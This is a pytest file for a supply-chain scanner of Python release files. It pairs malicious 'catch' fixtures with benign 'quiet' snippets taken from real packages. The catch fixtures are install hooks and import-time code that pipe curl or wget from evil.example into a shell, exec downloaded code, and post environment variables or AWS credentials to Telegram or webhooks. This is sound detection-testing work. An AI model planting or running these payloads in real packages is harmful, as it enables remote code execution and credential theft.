"""Precision and recall of the release-file scanner.

"catch" cases are inert copies of real attack shapes and must produce a finding at medium
or above. "quiet" cases are code from popular, legitimate PyPI packages that earlier
versions flagged; they must stay below medium. Together with the offline benchmark on the
250 most-downloaded packages (docs/benchmarks.md), they keep the scanner from getting
noisier or blinder.
"""

import hashlib
import io
import tarfile

import pytest

from oss_pulse.supplychain import artifacts
from oss_pulse.supplychain.code_scan import scan_file

MEDIUM_OR_ABOVE = {"medium", "high", "critical"}

# (id, expect, path inside the archive, context, file content)
CASES = [
    # (id, expect, path, context, code)   expect: "catch" (medium+) | "quiet" (nothing medium+)
    (
        "A setup os.system curl|sh",
        "catch",
        "p-1/setup.py",
        "sdist",
        "import os\nos.system('curl -s http://evil.example/x.sh | sh')\nfrom setuptools import setup\nsetup(name='p')\n",
    ),
    (
        "B cmdclass install override wget|bash",
        "catch",
        "p-1/setup.py",
        "sdist",
        "import os\nfrom setuptools import setup\nfrom setuptools.command.install import install\nclass PostInstall(install):\n    def run(self):\n        install.run(self)\n        os.system('wget -qO- http://1.2.3.4/a | bash')\nsetup(name='p', cmdclass={'install': PostInstall})\n",
    ),
    (
        "C setup Popen(b64decode)",
        "catch",
        "p-1/setup.py",
        "sdist",
        "import base64, subprocess\nsubprocess.Popen(base64.b64decode(P).decode(), shell=True)\n",
    ),
    (
        "D setup exec(urlopen().read())",
        "catch",
        "p-1/setup.py",
        "sdist",
        "import urllib.request\nexec(urllib.request.urlopen(U).read())\n",
    ),
    (
        "E setup exec(requests.get().text)",
        "catch",
        "p-1/setup.py",
        "sdist",
        "import requests\nexec(requests.get(U).text)\n",
    ),
    (
        "G setup negated publish guard",
        "catch",
        "p-1/setup.py",
        "sdist",
        "import sys, urllib.request\nif sys.argv[-1] != 'publish':\n    urllib.request.urlopen('https://x.example/s')\n",
    ),
    (
        "H __init__ urlretrieve+system",
        "catch",
        "p-1/p/__init__.py",
        "sdist",
        "import os, urllib.request\nurllib.request.urlretrieve('http://x/p', '/tmp/p')\nos.chmod('/tmp/p', 0o755)\nos.system('/tmp/p')\n",
    ),
    (
        "I __init__ func called at import",
        "catch",
        "p/__init__.py",
        "wheel",
        "import requests\ndef _bootstrap():\n    r = requests.get(U)\n    exec(r.text)\n_bootstrap()\n",
    ),
    (
        "J util.py download->exec in fn",
        "catch",
        "p/util.py",
        "wheel",
        "from urllib.request import urlopen\ndef f():\n    code = urlopen(U).read()\n    exec(code)\n",
    ),
    (
        "K __init__ os.system curl|bash",
        "catch",
        "p/__init__.py",
        "wheel",
        "import os\nos.system('curl -fsSL https://evil.example/x | bash')\n",
    ),
    (
        "L curl|bash via module variable",
        "catch",
        "p/__init__.py",
        "wheel",
        "import subprocess\nCMD = 'curl -fsSL https://evil.example/x | bash'\nsubprocess.call(CMD, shell=True)\n",
    ),
    (
        "M argv bash -c curl|sh",
        "catch",
        "p/core.py",
        "wheel",
        "import subprocess\nsubprocess.Popen(['bash', '-c', 'curl -s http://evil.example/x | sh'])\n",
    ),
    (
        "N powershell irm|iex",
        "catch",
        "p/win.py",
        "wheel",
        "import subprocess\nsubprocess.call(['powershell', '-Command', 'irm https://evil.example/p.ps1 | iex'])\n",
    ),
    (
        "O env as json= payload",
        "catch",
        "p/stats.py",
        "wheel",
        "import os, requests\nrequests.post(URL, json=dict(os.environ))\n",
    ),
    (
        "P bare telegram + creds harvest",
        "catch",
        "p/t.py",
        "wheel",
        "import os, requests\nAPI = 'https://api.telegram.org/bot'\nrequests.post(API + TOKEN + '/sendMessage', data={'t': open(os.path.expanduser('~/.aws/credentials')).read()})\n",
    ),
    (
        "Q hard-coded telegram bot token",
        "catch",
        "p/t.py",
        "wheel",
        "U = 'https://api.telegram.org/bot123456789:AAHkG7r3xQ2vYp8sLmN0wE1zT4uI6oP9aSdF/sendDocument'\n",
    ),
    (
        "R docstring decoy + real webhook.site",
        "catch",
        "p/h.py",
        "wheel",
        '"""Example: url="https://webhook.site/abc"."""\nimport requests\nrequests.post("https://webhook.site/0000-1111", data=x)\n',
    ),
    (
        "S comment decoy + real curl|sh",
        "catch",
        "p/__init__.py",
        "wheel",
        "import os\n# curl https://x | sh is how we install\nos.system('curl https://evil.example/x | sh')\n",
    ),
    (
        "T .pth curl|sh",
        "catch",
        "evil.pth",
        "wheel",
        "import os; os.system('curl -s http://x.example/a | sh')\n",
    ),
    (
        "V wheel-installed .sh curl|sh",
        "catch",
        "p/scripts/env.sh",
        "wheel",
        "#!/bin/sh\ncurl -s http://evil.example/x | sh\n",
    ),
    ("X PE disguised as .png", "catch", "p/assets/logo.png", "sdist", "MZ" + "\0" * 3000),
    ("Y ELF named .dat", "catch", "p-1/p/blob.dat", "sdist", "\x7fELF" + "\0" * 3000),
    (
        "Z envdump + discord webhook",
        "catch",
        "p/stats.py",
        "wheel",
        "import json, os\npayload = json.dumps(dict(os.environ))\nHOOK = 'https://discord.com/api/webhooks/000/xxx'\n",
    ),
    # ---- benign shapes taken from the benchmark FPs
    (
        "b1 version exec (h11)",
        "quiet",
        "p-1/setup.py",
        "sdist",
        "exec(open('h11/_version.py').read())\nsetup(name='h11')\n",
    ),
    (
        "b2 version exec with-open (google-auth)",
        "quiet",
        "p-1/setup.py",
        "sdist",
        "version = {}\nwith open(os.path.join(d, 'google/auth/version.py')) as fp:\n    exec(fp.read(), version)\nsetup(name='x', cmdclass={'build_ext': B})\n",
    ),
    (
        "b3 pkg-config (cffi)",
        "quiet",
        "p-1/setup.py",
        "sdist",
        "import subprocess\ndef _ask(o):\n    p = subprocess.Popen([pkg_config, o, 'libffi'], stdout=subprocess.PIPE)\nsetup(name='cffi')\n",
    ),
    (
        "b4 publish branch (requests-oauthlib)",
        "quiet",
        "p-1/setup.py",
        "sdist",
        "import os, sys\nif sys.argv[-1] == 'publish':\n    os.system('python setup.py sdist upload')\n    sys.exit()\n",
    ),
    (
        "b5 nested vendored setup.py (rapidfuzz)",
        "quiet",
        "p-1/extern/tbb/python/setup.py",
        "sdist",
        "import os\nos.system('make')\nsetup(name='TBB', cmdclass={'build': B})\n",
    ),
    (
        "b6 jaraco tarball (urlopen + other-fn subprocess)",
        "quiet",
        "jaraco/context/__init__.py",
        "wheel",
        "import os, subprocess, tarfile, urllib.request\ndef tarball(url):\n    req = urllib.request.urlopen(url)\n    with tarfile.open(fileobj=req, mode='r|*') as tf:\n        tf.extractall('x')\ndef repo(cmd):\n    subprocess.check_call(cmd)\n",
    ),
    (
        "b7 hf docstring installer",
        "quiet",
        "huggingface_hub/utils/_runtime.py",
        "wheel",
        'def f():\n    """i.e. using\n        curl -LsSf https://hf.co/cli/install.sh | bash\n    """\n    return 1\n',
    ),
    (
        "b8 hf self-update argv (user-triggered)",
        "quiet",
        "huggingface_hub/cli/_cli_utils.py",
        "wheel",
        "import subprocess\ndef _cmd():\n    return ['bash', '-c', 'curl -LsSf https://hf.co/cli/install.sh | bash']\ndef update():\n    return subprocess.call(_cmd())\n",
    ),
    (
        "b9 tqdm telegram integration",
        "quiet",
        "tqdm/contrib/telegram.py",
        "wheel",
        "from requests import Session\nclass TelegramIO:\n    API = 'https://api.telegram.org/bot'\n    def __init__(self, token):\n        self.token = token\n        Session().post(f'{self.API}{self.token}/sendMessage')\n",
    ),
    (
        "b10 meson env_tuple_to_str",
        "quiet",
        "mesonbuild/mtest.py",
        "sdist",
        "inherit_env = env_tuple_to_str(os.environ.items())\n",
    ),
    (
        "b11 cibuildwheel rustup in pyproject",
        "quiet",
        "tiktoken-0.14/pyproject.toml",
        "sdist",
        "[tool.cibuildwheel]\nlinux.before-all = \"curl --proto '=https' -sSf https://sh.rustup.rs | sh -s -- -y\"\n",
    ),
    (
        "b12 CI install.sh in sdist",
        "quiet",
        "numpy-2/vendored-meson/meson/ci/ciimage/opensuse/install.sh",
        "sdist",
        "curl -fsS https://dlang.org/install.sh | bash -s dmd\n",
    ),
    (
        "b13 launcher stub .exe in sdist",
        "quiet",
        "setuptools-84/setuptools/cli-64.exe",
        "sdist",
        "MZ" + "\0" * 14000,
    ),
]


@pytest.mark.parametrize("case_id, expect, path, context, code", CASES, ids=[c[0] for c in CASES])
def test_release_file_case(case_id, expect, path, context, code):
    severities = {h.effective_severity for h in scan_file(path, code.encode("latin-1"), context)}
    if expect == "catch":
        assert severities & MEDIUM_OR_ABOVE, f"missed: {case_id}"
    else:
        assert not severities & MEDIUM_OR_ABOVE, f"false positive: {case_id}: {severities}"


def _sdist(tmp_path, files):
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w:gz") as tf:
        for rel, content in files.items():
            blob = content.encode()
            info = tarfile.TarInfo(f"p-1.0/{rel}")
            info.size = len(blob)
            tf.addfile(info, io.BytesIO(blob))
    archive = buf.getvalue()
    sha = hashlib.sha256(archive).hexdigest()
    (tmp_path / f"{sha}-p-1.0.tar.gz").write_bytes(archive)
    return [
        {
            "filename": "p-1.0.tar.gz",
            "packagetype": "sdist",
            "size": len(archive),
            "digests": {"sha256": sha},
            "url": "offline",
        }
    ]


def test_shell_script_run_by_root_setup_py_is_scanned(tmp_path):
    release = _sdist(
        tmp_path,
        {
            "setup.py": "import subprocess\nsubprocess.call(['sh', 'install.sh'])\nsetup(name='p')\n",
            "install.sh": "#!/bin/sh\ncurl -s http://evil.example/x | sh\n",
            "ci/deploy.sh": "curl -s http://evil.example/ci | sh\n",
        },
    )
    findings = artifacts.scan_release("p", "1.0", release, tmp_path, None)
    flagged = {f.location for f in findings if f.severity in MEDIUM_OR_ABOVE}
    assert any("install.sh" in where for where in flagged)
    assert not any("deploy.sh" in where for where in flagged)
